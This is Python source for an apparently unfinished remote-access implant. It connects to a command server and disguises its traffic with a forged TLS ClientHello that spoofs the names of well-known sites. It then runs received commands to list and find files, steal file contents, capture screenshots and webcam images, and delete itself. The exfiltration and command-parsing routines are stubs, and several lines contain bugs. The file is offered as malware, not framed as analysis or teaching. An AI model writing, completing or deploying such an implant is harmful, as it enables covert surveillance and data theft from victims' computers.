import os
import random
from socket import *

import cv2
import pyautogui


def parsecmd(enccmd): # TODO
    ct = "" # command type
    cp = "" # command parameter
    return (ct, cp)

def execcmd(cmd):
    ct = cmd[0]
    cp = cmd[1]
    if ct == "ls": # list files
        ls(cp)
    elif ct == "find": # find file
        find(cp)
    elif ct == "get": # exfiltrate file
        get(cp)
    elif ct == "sc": # exfiltrate screenshot
        sc()
    elif ct == "cam": # exfiltrate webcame photo
        cam()
    elif ct == "sd": # self destruct
        sd()
    elif ct == "stat":
        exfil("1")
    else:
        exfil("0")

def ls(cp):
    if cp == "":
        path = "/"
    else:
        path = cp
    fs = os.listdir(path)
    exfil(fs)

def find(cp):
    out = ""
    for root, dirs, files in os.walk("/"):
        if cp in files:
            out.append(os.path.join(root,cp))
            out+="\n"
    exfil(out)

def get(cp):
    file = open(cp, "r")
    contents = file.read()
    exfil(contents)

def sc():
    exfil(pyautogui.screenshot())

def cam():
    img = cv2.VideoCapture(0)
    exfil(img.read()[1])

def sd():
    os.remove(__file__)

def exfil(info): # TODO
    print("exfil something")

ip = "1"
port = 443

def makehello():
    servernames = [
        "www.mitre.org", "www.amazon.com",
        "www.avast.com", "www.apple.com",
        "www.bing.com", "www.dell.com",
        "www.avira.com", "www.microsoft.com",
        "www.linkedin.com", "www.paypal.com",
        "www.google.com", "www.yahoo.com",
        "www.wikipedia.com", "www.wordpress.com"
    ]
    random.seed()
    servname = servernames[random.randint(0,14)].encode()
    servname_s = len(servname)

    extserv_pre = [
        0x00, 0x00,
        0x00, servname_s + 5,
        0x00, servname_s + 3,
        0x00,
        0x00, servname_s
    ]

    extserv = extserv_pre + servname

    extoth_p1 = [
        0x00, 0x0b, 0x00, 0x04, 0x03, 0x00, 0x01, 0x02, 0x00, 0x0a,
        0x00, 0x16, 0x00, 0x14, 0x00, 0x1d, 0x00, 0x17, 0x00, 0x1e,
        0x00, 0x19, 0x00, 0x18, 0x01, 0x00, 0x01, 0x01, 0x01, 0x02,
        0x01, 0x03, 0x01, 0x04, 0x00, 0x23, 0x00, 0x00, 0x00, 0x16,
        0x00, 0x00, 0x00, 0x17, 0x00, 0x00, 0x00, 0x0d, 0x00, 0x1e,
        0x00, 0x1c, 0x04, 0x03, 0x05, 0x03, 0x06, 0x03, 0x08, 0x07,
        0x08, 0x08, 0x08, 0x09, 0x08, 0x0a, 0x08, 0x0b, 0x08, 0x04,
        0x08, 0x05, 0x08, 0x06, 0x04, 0x01, 0x05, 0x01, 0x06, 0x01,
        0x00, 0x2b, 0x00, 0x03, 0x02, 0x03, 0x04, 0x00, 0x2d, 0x00,
        0x02, 0x01, 0x01, 0x00, 0x33, 0x00, 0x26, 0x00, 0x24, 0x00,
        0x1d, 0x00, 0x20, 0x35, 0x80, 0x72, 0xd6, 0x36, 0x58, 0x80,
        0xd1, 0xae, 0xea, 0x32, 0x9a, 0xdf, 0x91, 0x21, 0x38, 0x38,
        0x51, 0xed, 0x21, 0xa2, 0x8e, 0x3b, 0x75, 0xe9, 0x65, 0xd0,
        0xd2, 0xcd, 0x16, 0x62, 0x54
    ]
    extoth_p2 = []
    for x in range(0,32):
        extoth_p2.append(random.randbytes(1))
    extoth = extoth_p1 + extoth_p2

    ext = extserv + extoth

    cvel_r1 = []
    cvel_r2 = []
    for x in range(0,32):
        cvel_r1.append(random.randbytes(1))
        cvel_r2.append(random.randbytes(1))
    
    cvel_p1 = [
        0x03, 0x03
    ]
    cvel_p2 = [
        0x20
    ]
    cvel_p3 = [
        0x00, 0x08, 0x13, 0x02, 0x13, 0x03, 0x13, 0x01, 0x00, 0xff, 0x01, 0x00, 0x00, len(ext)
    ]
    cvel = cvel_p1 + cvel_r1 + cvel_p2 + cvel_r2 + cvel_p3

    cvrest = cvel + ext
    cvrest_s = len(cvrest)

    top = [
        0x16, 0x03, 0x01,
        0x00, cvrest_s + 4,
        0x01, 0x00,
        0x00, cvrest_s
    ]

    clihel = top + cvrest
    return clihel

def sendhello(clientSocket):
    clihel = makehello()
    clientSocket.send(clihel)

def sendhellofin(clientSocket):
    clihelfin_p1 = [
        0x14, 0x03, 0x03, 0x00, 0x01, 0x01, 0x17, 0x03,
        0x03, 0x00, 0x45
    ]
    clihelfin_p2 = []
    for x in range(0,69):
        clihelfin_p2.append(random.randbytes(1))
    clihelfin = clihelfin_p1 + clihelfin_p2

    clientSocket.send(clihelfin)

def main():
    clientSocket = socket(AF_INET, SOCK_STREAM)
    clientSocket.settimeout(15.0)
    try:
        clientSocket.connect((ip, port))
    except:
        print("Connection failed")
        return 1
    sendhello(clientSocket)
    clientSocket.recv(2048) # server reply
    sendhellofin(clientSocket)

    while True:
        message = clientSocket.recv(2048)
        command = parsecmd(message)
        execcmd(command)

if __name__ == "__main__":
    main()